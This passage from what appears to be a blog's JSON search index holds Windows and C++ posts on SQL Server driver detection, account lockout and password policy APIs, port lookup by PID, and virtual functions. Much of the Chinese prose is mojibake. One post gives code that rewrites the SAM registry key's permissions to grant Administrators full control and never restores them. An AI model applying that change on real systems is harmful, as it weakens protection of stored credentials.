= false; bool sql2012 = false; bool more = true; // Enumerate through all keys while(more) &#123; // Size modified with each call to RegEnumKeyEx int size = 1024; // Get next key rc = RegEnumKeyEx(hKey, i, key, (LPDWORD)&amp;size, NULL, NULL, NULL, NULL); if(rc != ERROR_SUCCESS) &#123; more = false; break; &#125; // SQL Server 2000 driver if(strcmp(key, &quot;SQL Server&quot;) == 0) sql2000 = true; else // SQL Server 2005 Native client if(strcmp(key, &quot;SQL Native Client&quot;) == 0) sql2005 = true; else // SQL Server 2008 Native client if(strcmp(key, &quot;SQL Server Native Client 10.0&quot;) == 0) sql2008 = true; else // SQL Server 2012, 2014 and 2016 Native client if(strcmp(key, &quot;SQL Server Native Client 11.0&quot;) == 0) sql2012 = true; i++; &#125; RegCloseKey(hKey); // Return the highest available version (this driver is also used for 2014 and 2016) if(sql2012) &#123; driver = &quot;Driver=&#123;SQL Server Native Client 11.0&#125;;&quot;; dll = &quot;sqlncli11.dll&quot;; &#125; else if(sql2008) &#123; driver = &quot;Driver=&#123;SQL Server Native Client 10.0&#125;;&quot;; dll = &quot;sqlncli10.dll&quot;; &#125; else if(sql2005) &#123; driver = &quot;Driver=&#123;SQL Native Client&#125;;&quot;; dll = &quot;sqlncli.dll&quot;; &#125; else if(sql2000) &#123; driver = &quot;Driver=&#123;SQL Server&#125;;&quot;; dll = &quot;sqlsrv32.dll&quot;; &#125; #endif&#125; ç½‘ç»œåè®® 1234567891011121314151617switch (Protocol)&#123; case NetworkProtocol.Pipes: connectionBuilder.Append(&quot;Network=dbnmpntw&quot;); break; case NetworkProtocol.Shared: connectionBuilder.Append(&quot;Network=dbmslpcn&quot;); break; case NetworkProtocol.Tcp: connectionBuilder.Append(&quot;Network=dbmssocn&quot;); break; default: break;&#125; ä¸€ä¸ªåŸºç¡€çš„ Demo ç”¨äºè¿æ¥ SQLServer 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;windows.h&gt;#include &lt;sql.h&gt;#include &lt;sqlext.h&gt;#include &lt;iostream&gt;int main() &#123; SQLHENV hEnv = NULL; SQLHDBC hDbc = NULL; SQLRETURN retcode; // Allocate environment handle SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &amp;hEnv); SQLSetEnvAttr(hEnv, SQL_ATTR_ODBC_VERSION, (SQLPOINTER)SQL_OV_ODBC3, 0); // Allocate connection handle SQLAllocHandle(SQL_HANDLE_DBC, hEnv, &amp;hDbc); // Set up connection string (as a wide string literal) // Note: You might need to adjust the connection string based on your setup WCHAR connStr[] = L&quot;DRIVER=&#123;SQL Server Native Client 10.0&#125;;&quot; L&quot;SERVER=myServerAddress;&quot; L&quot;INTEGRATED SECURITY=True;&quot; L&quot;DATABASE=myDatabase;&quot;; // Connect to SQL Server retcode = SQLDriverConnect(hDbc, NULL, connStr, SQL_NTS, NULL, 0, NULL, SQL_DRIVER_NOPROMPT); if (retcode == SQL_SUCCESS || retcode == SQL_SUCCESS_WITH_INFO) &#123; std::cout &lt;&lt; &quot;Connection successful!&quot; &lt;&lt; std::endl; // Perform database operations here... &#125; else &#123; std::cerr &lt;&lt; &quot;Connection failed.&quot; &lt;&lt; std::endl; // Handle connection error... &#125; // Disconnect and free up allocated handles SQLDisconnect(hDbc); SQLFreeHandle(SQL_HANDLE_DBC, hDbc); SQLFreeHandle(SQL_HANDLE_ENV, hEnv); return 0;&#125;","tags":[{"name":"weakpwd","slug":"weakpwd","permalink":"https://hodlyounger.github.io/tags/weakpwd/"},{"name":"SQLServer","slug":"SQLServer","permalink":"https://hodlyounger.github.io/tags/SQLServer/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"å¼±å¯†ç ","slug":"wiki/å¼±å¯†ç ","permalink":"https://hodlyounger.github.io/categories/wiki/%E5%BC%B1%E5%AF%86%E7%A0%81/"}]},{"title":"ã€ç»„ç­–ç•¥ã€‘è´¦æˆ·é”å®šç­–ç•¥","date":"2024-08-20T03:05:26.938Z","path":"A_OS/Windows/ç»„ç­–ç•¥/å®‰å…¨è®¾ç½®/è´¦æˆ·ç­–ç•¥/ã€ç»„ç­–ç•¥ã€‘è´¦æˆ·é”å®šç­–ç•¥/","text":"æ¦‚è¿°ï¼šWindows å®‰å…¨è®¾ç½®ä¸‹è´¦æˆ·é”å®šç­–ç•¥ç›¸å…³å†…å®¹ è´¦æˆ·é”å®šç­–ç•¥æ¡ç›® æ‰“å¼€æ–¹å¼ï¼šWin+R -&gt; gpedit.mscï¼ˆåŸŸæ§æœ¬åœ°ç®¡ç†å‘˜æ— æ³•ä¿®æ”¹ï¼‰ã€‚å¦‚æœæ˜¯åœ¨åŸŸæ§æœåŠ¡å™¨ä¸Šï¼Œåˆ™éœ€è¦è¾“å…¥ rsop.msc æ¥æŸ¥çœ‹ï¼Œå¦‚æœä¿®æ”¹è¯·æŸ¥çœ‹ä¸‹ä¸€å°èŠ‚ã€‚ è´¦æˆ·é”å®šæ—¶é—´ å¸æˆ·é”å®šæ—¶é—´ æ­¤å®‰å…¨è®¾ç½®ç¡®å®šé”å®šå¸æˆ·åœ¨è‡ªåŠ¨è§£é”ä¹‹å‰ä¿æŒé”å®šçš„åˆ†é’Ÿæ•°ã€‚å¯ç”¨èŒƒå›´ä» 0 åˆ° 99,999 åˆ†é’Ÿã€‚å¦‚æœå°†å¸æˆ·é”å®šæ—¶é—´è®¾ç½®ä¸º 0ï¼Œå¸æˆ·å°†ä¸€ç›´è¢«é”å®šç›´åˆ°ç®¡ç†å‘˜æ˜ç¡®è§£é™¤å¯¹å®ƒçš„é”å®šã€‚ å¦‚æœå®šä¹‰äº†å¸æˆ·é”å®šé˜ˆå€¼ï¼Œåˆ™å¸æˆ·é”å®šæ—¶é—´å¿…é¡»å¤§äºæˆ–ç­‰äºé‡ç½®æ—¶é—´ã€‚ é»˜è®¤å€¼: æ— ï¼Œå› ä¸ºåªæœ‰åœ¨æŒ‡å®šäº†å¸æˆ·é”å®šé˜ˆå€¼æ—¶ï¼Œæ­¤ç­–ç•¥è®¾ç½®æ‰æœ‰æ„ä¹‰ã€‚ å³è´¦æˆ·è¢«é”å®šåå¼€å§‹ï¼Œè¿‡äº†å¤šé•¿æ—¶é—´æ‰èƒ½è§£é” è´¦æˆ·é”å®šé˜ˆå€¼ å¸æˆ·é”å®šé˜ˆå€¼ æ­¤å®‰å…¨è®¾ç½®ç¡®å®šå¯¼è‡´ç”¨æˆ·å¸æˆ·è¢«é”å®šçš„ç™»å½•å°è¯•å¤±è´¥çš„æ¬¡æ•°ã€‚åœ¨ç®¡ç†å‘˜é‡ç½®é”å®šå¸æˆ·æˆ–å¸æˆ·é”å®šæ—¶é—´æœŸæ»¡ä¹‹å‰ï¼Œæ— æ³•ä½¿ç”¨è¯¥é”å®šå¸æˆ·ã€‚å¯ä»¥å°†ç™»å½•å°è¯•å¤±è´¥æ¬¡æ•°è®¾ç½®ä¸ºä»‹äº 0 å’Œ 999 ä¹‹é—´çš„å€¼ã€‚å¦‚æœå°†å€¼è®¾ç½®ä¸º 0ï¼Œåˆ™æ°¸è¿œä¸ä¼šé”å®šå¸æˆ·ã€‚ åœ¨ä½¿ç”¨ Ctrl+Alt+Del æˆ–å¯†ç ä¿æŠ¤çš„å±å¹•ä¿æŠ¤ç¨‹åºé”å®šçš„å·¥ä½œç«™æˆ–æˆå‘˜æœåŠ¡å™¨ä¸Šçš„å¯†ç å°è¯•å¤±è´¥å°†è®¡ä½œç™»å½•å°è¯•å¤±è´¥ã€‚ é»˜è®¤å€¼: 0ã€‚ å³è´¦æˆ·åœ¨å°è¯•ç™»å½•æ—¶ï¼Œå¤±è´¥å‡ æ¬¡åä¼šé”å®šè´¦æˆ·ã€‚ é‡ç½®è´¦æˆ·é”å®šè®¡æ•°å™¨ åœ¨æ­¤åå¤ä½å¸æˆ·é”å®šè®¡æ•°å™¨ æ­¤å®‰å…¨è®¾ç½®ç¡®å®šåœ¨æŸæ¬¡ç™»å½•å°è¯•å¤±è´¥ä¹‹åå°†ç™»å½•å°è¯•å¤±è´¥è®¡æ•°å™¨é‡ç½®ä¸º 0 æ¬¡é”™è¯¯ç™»å½•å°è¯•ä¹‹å‰éœ€è¦çš„æ—¶é—´ã€‚å¯ç”¨èŒƒå›´æ˜¯ 1 åˆ° 99,999 åˆ†é’Ÿã€‚ å¦‚æœå®šä¹‰äº†å¸æˆ·é”å®šé˜ˆå€¼ï¼Œæ­¤é‡ç½®æ—¶é—´å¿…é¡»å°äºæˆ–ç­‰äºå¸æˆ·é”å®šæ—¶é—´ã€‚ é»˜è®¤å€¼: æ— ï¼Œå› ä¸ºåªæœ‰åœ¨æŒ‡å®šäº†å¸æˆ·é”å®šé˜ˆå€¼æ—¶ï¼Œæ­¤ç­–ç•¥è®¾ç½®æ‰æœ‰æ„ä¹‰ã€‚ å³è´¦æˆ·é”å®šé˜ˆå€¼åœ¨é”å®šä¹‹åç»è¿‡å¤šä¹…ä½¿è´¦æˆ·é”å®šé˜ˆå€¼æ¸… 0ã€‚ ç›¸å…³é—®é¢˜ åŸŸæ§æœåŠ¡å™¨çš„ç­–ç•¥å¦‚ä½•è®¾ç½® åœ¨åŸŸæ§æœåŠ¡å™¨ä¸Šï¼Œä¿®æ”¹ç™»å½•ç­–ç•¥ã€‚ å·¥å…· -&gt; ç»„ç­–ç•¥ç®¡ç†.rxdymyckqzjz{zoom:50%;} ç¼–è¾‘é»˜è®¤åŸŸæ§.ojwdtygzkfky{zoom:50%;} ç»„ç­–ç•¥ç®¡ç†ç¼–è¾‘å™¨.oujbttnguvio{zoom: 50%;} C++ è·å–é”å®šç­–ç•¥ 12345678910111213141516171819202122232425262728293031BOOL IsAccountLockoutPolicyOpen(LPCWSTR ServerName, BOOL&amp; bOpen)&#123; MYTRACE(L&quot;ç¡®è®¤è´¦æˆ·é”å®šç­–ç•¥æ˜¯å¦å¼€å¯&quot;); BOOL bSuc = FALSE; DWORD dwLevel = 3; USER_MODALS_INFO_3 *pBuf = NULL; NET_API_STATUS nStatus = NetUserModalsGet(ServerName, dwLevel, (LPBYTE *)&amp;pBuf); if (nStatus == NERR_Success) &#123; if (pBuf != NULL) &#123; bSuc = TRUE; if(pBuf-&gt;usrmod3_lockout_threshold == 0) &#123; bOpen = FALSE; &#125; else &#123; bOpen = TRUE; &#125; &#125; &#125; if (pBuf != NULL) NetApiBufferFree(pBuf); return bSuc;&#125;","tags":[{"name":"gpedit","slug":"gpedit","permalink":"https://hodlyounger.github.io/tags/gpedit/"},{"name":"ç»„ç­–ç•¥/å®‰å…¨è®¾ç½®/è´¦æˆ·ç­–ç•¥/è´¦æˆ·é”å®šç­–ç•¥","slug":"ç»„ç­–ç•¥-å®‰å…¨è®¾ç½®-è´¦æˆ·ç­–ç•¥-è´¦æˆ·é”å®šç­–ç•¥","permalink":"https://hodlyounger.github.io/tags/%E7%BB%84%E7%AD%96%E7%95%A5-%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE-%E8%B4%A6%E6%88%B7%E7%AD%96%E7%95%A5-%E8%B4%A6%E6%88%B7%E9%94%81%E5%AE%9A%E7%AD%96%E7%95%A5/"},{"name":"å®‰å…¨è®¾ç½®","slug":"å®‰å…¨è®¾ç½®","permalink":"https://hodlyounger.github.io/tags/%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç»„ç­–ç•¥","slug":"A-OS/Windows/ç»„ç­–ç•¥","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/"},{"name":"å®‰å…¨è®¾ç½®","slug":"A-OS/Windows/ç»„ç­–ç•¥/å®‰å…¨è®¾ç½®","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/"},{"name":"è´¦æˆ·ç­–ç•¥","slug":"A-OS/Windows/ç»„ç­–ç•¥/å®‰å…¨è®¾ç½®/è´¦æˆ·ç­–ç•¥","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/%E8%B4%A6%E6%88%B7%E7%AD%96%E7%95%A5/"}]},{"title":"ã€ç»„ç­–ç•¥ã€‘å¯†ç ç­–ç•¥","date":"2024-08-20T03:05:26.925Z","path":"A_OS/Windows/ç»„ç­–ç•¥/å®‰å…¨è®¾ç½®/è´¦æˆ·ç­–ç•¥/ã€ç»„ç­–ç•¥ã€‘å¯†ç ç­–ç•¥/","text":"æ¦‚è¿°: ç»„ç­–ç•¥-å¯†ç ç­–ç•¥è¯´æ˜ 0x01 å¯†ç ç­–ç•¥å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 0x02 è¯¦ç»†è¯´æ˜ 1 æ”¾å®½æœ€å°å¯†ç é•¿åº¦é™åˆ¶ 2 å¯†ç å¿…é¡»ç¬¦åˆå¤æ‚æ€§è¦æ±‚ 3 å¯†ç é•¿åº¦æœ€å°å€¼ 4 å¯†ç æœ€çŸ­ä½¿ç”¨æœŸé™ 5 å¯†ç æœ€é•¿ä½¿ç”¨æœŸé™ æ³¨å†Œè¡¨ï¼š 6 å¼ºåˆ¶å¯†ç å†å² 7 ç”¨æˆ·å¯è¿˜åŸçš„åŠ å¯†æ¥å­˜å‚¨å¯†ç  8 æœ€å°å¯†ç é•¿åº¦å®¡æ ¸ ç›¸å…³API ç”¨NetUserå‡½æ•°ä¿®æ”¹å¯†ç ç­–ç•¥ å¯ä»¥ä½¿ç”¨ NetUserModalsGet æ¥æŸ¥è¯¢å¯†ç ç­–ç•¥ï¼Œæœ€åéœ€è¦ä½¿ç”¨ NetApiBufferFree æ¥é‡Šæ”¾ æŸ¥è¯¢åˆ°çš„æ•°æ®ç©ºé—´ã€‚è¿˜å¯ä»¥ä½¿ç”¨ NetUserModalsSet å¯ä»¥å¯¹å¯†ç ç­–ç•¥è¿›è¡Œè®¾å®šã€‚ 12345NET_API_STATUS NetUserModalsGet( _In_opt_ LPCWSTR servername, _In_ DWORD level, _Out_ LPBYTE *bufptr); // æŸ¥è¯¢å¯†ç ç­–ç•¥ 123NET_API_STATUS NetApiBufferFree( _In_ LPVOID Buffer); // é‡Šæ”¾æŸ¥è¯¢çš„æ•°æ®ç©ºé—´ 123456NET_API_STATUS NetUserModalsSet( _In_ LPCWSTR servername, _In_ DWORD level, _In_ LPBYTE buf, _Out_ LPDWORD parm_err); // è®¾å®šå¯†ç ç­–ç•¥ è¿™ä¸¤ä¸ªå‡½æ•°ä¸­ level å‚æ•°å†³å®šäº†è¦å¤„ç†æ•°æ®çš„ç±»å‹ï¼Œå¯ä»¥å–å€¼çš„å†…å®¹ä¸º Value Meaning Structure 0 Specifies global password parameters. USER_MODALS_INFO_0 1 Specifies logon server and domain controller information. USER_MODALS_INFO_1 2 Specifies the domain name and identifier. USER_MODALS_INFO_2 3 Specifies lockout information. USER_MODALS_INFO_3 1001 Specifies the minimum allowable password length. USER_MODALS_INFO_1001 1002 Specifies the maximum allowable password age. USER_MODALS_INFO_1002 1003 Specifies the minimum allowable password age. USER_MODALS_INFO_1003 1004 Specifies forced logoff information. USER_MODALS_INFO_1004 1005 Specifies the length of the password history. USER_MODALS_INFO_1005 1006 Specifies the role of the logon server. USER_MODALS_INFO_1006 1007 Specifies domain controller information. USER_MODALS_INFO_1007 å¦‚ä¸‹æ˜¯ä½¿ç”¨ NetUserModalsGet æŸ¥è¯¢æ—¶ï¼Œæˆ‘ä»¬å…³æ³¨çš„ç»“æ„ä½“ä¿¡æ¯ 123456789101112typedef struct _USER_MODALS_INFO_0 &#123; DWORD usrmod0_min_passwd_len; // å¯†ç é•¿åº¦æœ€å°å€¼ DWORD usrmod0_max_passwd_age; // å¯†ç æœ€é•¿ä½¿ç”¨æœŸé™(ç§’) DWORD usrmod0_min_passwd_age; // å¯†ç æœ€çŸ­ä½¿ç”¨æœŸé™(ç§’) DWORD usrmod0_force_logoff; // è¿‡æœŸåå¼ºåˆ¶æ³¨é”€çš„æœŸé™(ç§’) DWORD usrmod0_password_hist_len; // å¼ºåˆ¶å¯†ç å†å²ä¸ªæ•°&#125; USER_MODALS_INFO_0, *PUSER_MODALS_INFO_0, *LPUSER_MODALS_INFO_0;typedef struct _USER_MODALS_INFO_3 &#123; DWORD usrmod3_lockout_duration; // è´¦æˆ·é”å®šæ—¶é—´(ç§’) DWORD usrmod3_lockout_observation_window; // é‡ç½®è´¦æˆ·é”å®šè®¡æ•°å™¨(ç§’) DWORD usrmod3_lockout_threshold; // è´¦æˆ·é”å®šé˜ˆå€¼&#125; USER_MODALS_INFO_3, *PUSER_MODALS_INFO_3, *LPUSER_MODALS_INFO_3; ä½¿ç”¨ NetUserModalsSet é™¤äº†ä»¥ä¸Šç»“æ„ä½“è¿›è¡Œæ•´ä½“è®¾ç½®å¤–ï¼Œè¿˜å¯ä»¥å¯¹éƒ¨åˆ†å‚æ•°è¿›è¡Œå•ç‹¬è®¾ç½® 123456789101112131415typedef struct _USER_MODALS_INFO_1001 &#123; DWORD usrmod1001_min_passwd_len; // å¯†ç é•¿åº¦æœ€å°å€¼&#125; USER_MODALS_INFO_1001, *PUSER_MODALS_INFO_1001, *LPUSER_MODALS_INFO_1001;typedef struct _USER_MODALS_INFO_1002 &#123; DWORD usrmod1002_max_passwd_age; // å¯†ç æœ€é•¿ä½¿ç”¨æœŸé™(ç§’)&#125; USER_MODALS_INFO_1002, *PUSER_MODALS_INFO_1002, *LPUSER_MODALS_INFO_1002;typedef struct _USER_MODALS_INFO_1003 &#123; DWORD usrmod1003_min_passwd_age; // å¯†ç æœ€çŸ­ä½¿ç”¨æœŸé™(ç§’)&#125; USER_MODALS_INFO_1003, *PUSER_MODALS_INFO_1003, *LPUSER_MODALS_INFO_1003;typedef struct _USER_MODALS_INFO_1004 &#123; DWORD usrmod1004_force_logoff; // è¿‡æœŸåå¼ºåˆ¶æ³¨é”€çš„æœŸé™(ç§’)&#125; USER_MODALS_INFO_1004, *PUSER_MODALS_INFO_1004, *LPUSER_MODALS_INFO_1004;typedef struct _USER_MODALS_INFO_1005 &#123; DWORD usrmod1005_password_hist_len; // å¼ºåˆ¶å¯†ç å†å²ä¸ªæ•°&#125; USER_MODALS_INFO_1005, *PUSER_MODALS_INFO_1005, *LPUSER_MODALS_INFO_1005; å¯†ç å¤æ‚åº¦çš„å¤„ç† çœ‹åˆ°è¿™é‡Œæ˜¯ä¸æ˜¯å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯ å¯†ç å¿…é¡»ç¬¦åˆå¤æ‚æ€§è¦æ±‚ è¿™é¡¹é…ç½®ï¼ŒæŸ¥è¯¢ä¸åˆ°ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ç›´æ¥è¯»å– SAM æ³¨å†Œè¡¨çš„ä¿¡æ¯ï¼Œæ¥åˆ¤æ–­å¯†ç å¤æ‚åº¦æ˜¯å¦å¯ç”¨ 123456789101112131415161718BOOL CheckPwdComplexPolicy()&#123; HKEY hKey = NULL; // æ‰“å¼€å¯†ç ç­–ç•¥æ³¨å†Œè¡¨ LONG lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;SAM\\\\SAM\\\\Domains\\\\Account&quot;, 0, KEY_ALL_ACCESS, &amp;hKey); if (lResult != ERROR_SUCCESS) return FALSE; // è¯»å–å¯†ç ç­–ç•¥æ³¨å†Œè¡¨ä¿¡æ¯ DWORD dwLen = 1024; BYTE pBuf[1024] = &#123; 0 &#125;; lResult = RegQueryValueEx(hKey, &quot;F&quot;, NULL, NULL, pBuf, &amp;dwLen); RegCloseKey(hKey); if (lResult != ERROR_SUCCESS) return FALSE; // æ£€æŸ¥å¯†ç å¤æ‚åº¦æ˜¯å¦å¯ç”¨ if (pBuf[76] != 1) return FALSE; // å¤æ‚åº¦(0æœªå¯ç”¨)(1å·²å¯ç”¨) // if (pBuf[80] &lt; 8) return FALSE; // æœ€å°é•¿åº¦ return TRUE;&#125; æ™®é€šæƒ…å†µä¸‹ SAM æ³¨å†Œè¡¨æ˜¯ä¸å…è®¸è®¿é—®çš„ï¼Œå°±éœ€è¦æˆ‘ä»¬é¦–å…ˆä¿®æ”¹ä¸€ä¸‹è®¿é—® SAM çš„æƒé™ 1234567891011121314151617181920212223242526272829303132333435BOOL ModifySamRegPrivilege()&#123; PACL pOldDacl = NULL; PSECURITY_DESCRIPTOR pSID = NULL; // è·å–SAMä¸»é”®çš„DACL DWORD dRet = GetNamedSecurityInfo(&quot;MACHINE\\\\SAM\\\\SAM&quot;, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, &amp;pOldDacl, NULL, &amp;pSID); if (dRet != ERROR_SUCCESS) &#123; LocalFree(pSID); return FALSE; &#125; // åˆ›å»ºä¸€ä¸ªACE,å…è®¸Administratorsç»„æˆå‘˜å®Œå…¨æ§åˆ¶å¯¹è±¡,å¹¶å…è®¸å­å¯¹è±¡ç»§æ‰¿æ­¤æƒé™ EXPLICIT_ACCESS_A eia = &#123; 0 &#125;; BuildExplicitAccessWithName(&amp;eia, &quot;Administrators&quot;, KEY_ALL_ACCESS, SET_ACCESS, SUB_CONTAINERS_AND_OBJECTS_INHERIT); // å°†æ–°çš„ACEåŠ å…¥DACL PACL pNewDacl = NULL; dRet = SetEntriesInAcl(1, &amp;eia, pOldDacl, &amp;pNewDacl); if (dRet != ERROR_SUCCESS) &#123; LocalFree(pSID); return FALSE; &#125; // æ›´æ–°SAMä¸»é”®çš„DACL dRet = SetNamedSecurityInfo(&quot;MACHINE\\\\SAM\\\\SAM&quot;, SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDacl, NULL); if (dRet != ERROR_SUCCESS) &#123; LocalFree(pNewDacl); LocalFree(pSID); return FALSE; &#125; return TRUE;&#125;","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"ç»„ç­–ç•¥/å®‰å…¨è®¾ç½®/è´¦æˆ·ç­–ç•¥/å¯†ç ç­–ç•¥","slug":"ç»„ç­–ç•¥-å®‰å…¨è®¾ç½®-è´¦æˆ·ç­–ç•¥-å¯†ç ç­–ç•¥","permalink":"https://hodlyounger.github.io/tags/%E7%BB%84%E7%AD%96%E7%95%A5-%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE-%E8%B4%A6%E6%88%B7%E7%AD%96%E7%95%A5-%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5/"},{"name":"gpedit","slug":"gpedit","permalink":"https://hodlyounger.github.io/tags/gpedit/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç»„ç­–ç•¥","slug":"A-OS/Windows/ç»„ç­–ç•¥","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/"},{"name":"å®‰å…¨è®¾ç½®","slug":"A-OS/Windows/ç»„ç­–ç•¥/å®‰å…¨è®¾ç½®","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/"},{"name":"è´¦æˆ·ç­–ç•¥","slug":"A-OS/Windows/ç»„ç­–ç•¥/å®‰å…¨è®¾ç½®/è´¦æˆ·ç­–ç•¥","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/%E8%B4%A6%E6%88%B7%E7%AD%96%E7%95%A5/"}]},{"title":"ã€winã€‘é€šè¿‡PIDè·å–ç«¯å£","date":"2024-08-18T16:00:00.000Z","path":"A_OS/Windows/è¿›ç¨‹çº¿ç¨‹/ã€winã€‘é€šè¿‡PIDè·å–ç«¯å£/","text":"æ¦‚è¿°ï¼šé€šè¿‡ PID è·å–è¿›ç¨‹çš„ç«¯å£ã€‚ æ€è·¯è¯´æ˜ ä¸»è¦æ˜¯é€šè¿‡ GetExtendedTcpTable è·å–ç³»ç»Ÿå½“å‰æ‰€æœ‰çš„ TCP è¿æ¥ã€‚é€šè¿‡è·å–åˆ°çš„æ•°æ®ç»“æ„ä½“ PMIB_TCPTABLE_OWNER_PID ä¸­çš„å‚æ•° dwOwningPid æ¥åˆ¤æ–­å½“å‰ç«¯å£æ‰€å±è¿›ç¨‹ï¼Œä»è€Œè¾¾åˆ°è·å–å½“å‰è¿›ç¨‹ç«¯å£çš„ç›®çš„ã€‚ ç›¸å…³æ¥å£ GetExtendedTcpTable function (iphlpapi.h) - Win32 apps | Microsoft Learn æ ¹æ®å‚æ•° 5 TCP_TABLE_CLASS çš„ä¸åŒï¼Œä¼šè¿”å›ä¸åŒçš„ç»“æ„ä½“å†…å®¹ã€‚ ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647UINT16 GetProcessPort(DWORD dwProcesId)&#123; PMIB_TCPTABLE_OWNER_PID pTcpTable = NULL; DWORD dwSize = 0; DWORD dwNum = 0; UINT16 uLocalPort = 0; if (dwProcesId == 0) &#123; return uLocalPort; &#125; do &#123; if (GetExtendedTcpTable(pTcpTable, &amp;dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) != ERROR_INSUFFICIENT_BUFFER) &#123; break; &#125; pTcpTable = (MIB_TCPTABLE_OWNER_PID*)new(std::nothrow) char[dwSize];//é‡æ–°åˆ†é…ç¼“å†²åŒº if (!pTcpTable) &#123; break; &#125; if (GetExtendedTcpTable(pTcpTable, &amp;dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) != NO_ERROR) &#123; MYTRACE(L&quot;[GetProcessPort] GetExtendedTcpTable failed (%d)\\n&quot;, GetLastError()); break; &#125; dwNum = pTcpTable-&gt;dwNumEntries; //TCPè¿æ¥çš„æ•°ç›® for (DWORD i = 0; i &lt; dwNum; i++) &#123; if (pTcpTable-&gt;table[i].dwOwningPid == dwProcesId) &#123; uLocalPort = htons((u_short)pTcpTable-&gt;table[i].dwLocalPort); break; &#125; &#125; &#125; while (0); if (pTcpTable != NULL) &#123; char * pT = (char *)pTcpTable; delete[] pT; &#125; return uLocalPort;&#125;","tags":[{"name":"windows/API","slug":"windows-API","permalink":"https://hodlyounger.github.io/tags/windows-API/"},{"name":"ç«¯å£","slug":"ç«¯å£","permalink":"https://hodlyounger.github.io/tags/%E7%AB%AF%E5%8F%A3/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"è¿›ç¨‹çº¿ç¨‹","slug":"A-OS/Windows/è¿›ç¨‹çº¿ç¨‹","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/"}]},{"title":"ã€CPPã€‘è™šå‡½æ•°","date":"2024-08-15T04:22:47.263Z","path":"B_Code/CPP/ã€CPPã€‘è™šå‡½æ•°/","text":"æ¦‚è¿°ï¼šè™šå‡½æ•°çš„ç›¸å…³é—®é¢˜æ•´ç†åŠé€†å‘åˆ†æï¼Œä»¥åŠå¦‚ä½•é€šè¿‡æ•°ç»„æŒ‡å®šè°ƒç”¨è™šå‡½æ•°ã€‚ ç›¸å…³æ–‡ç« æ¨èï¼š C++è™šå‡½æ•°è¯¦è§£-CSDNåšå®¢ C++ä¸­çš„RTTIæœºåˆ¶è§£æ - RunningSnail - åšå®¢å›­ ç¯å¢ƒè¯´æ˜ï¼š https://www.onlinegdb.com/ C++ 14 åŸºæœ¬è¯´æ˜ è™šå‡½æ•°è¡¨å±äºç±»ï¼Œç±»çš„æ‰€æœ‰å¯¹è±¡å…±äº«è¿™ä¸ªç±»çš„è™šå‡½æ•°è¡¨ã€‚ æ„æ€å°±æ˜¯åˆ›å»ºçš„æ‰€æœ‰ç±»å¯¹è±¡æŒ‡å‘çš„è™šå‡½æ•°è¡¨éƒ½æ˜¯åŒä¸€ä¸ªåœ°å€ã€‚ ç»§æ‰¿çŠ¶æ€ä¸‹çš„è™šå‡½æ•°è¡¨å†…å­˜ æ²¡æœ‰é‡å†™æ—¶ï¼Œç»§ç»­ä½¿ç”¨çˆ¶ç±»çš„å…ƒç´ åœ°å€ é‡å†™åï¼Œä½¿ç”¨å½“å‰ç±»çš„å…ƒç´ åœ°å€ æ´¾ç”Ÿç±»å‡½æ•°ä¸­å¤šå‡ºæ¥çš„è™šå‡½æ•°çš„è®¿é—®ï¼ˆåŸºç±»æŒ‡é’ˆæŒ‡å‘æ´¾ç”Ÿç±»æˆå‘˜ï¼‰ ä»¥ä¸Šè¯´æ˜åœ¨æ–‡ä¸­éƒ½æœ‰ Demo ã€‚ ä»£ç æ¼”ç¤º ç±»çš„å¤§å° è¿™å—å†…å®¹æ¯”è¾ƒç®€å•ï¼Œå†™ä¸ªä»£ç ç®€å•è·‘ä¸‹å³å¯ã€‚ 12345678910111213141516171819202122232425262728// ç±»å¤§å°ä¸º1class Base &#123; int m_ch;&#125;// ç±»å¤§å°ä¸º4class Base &#123; int 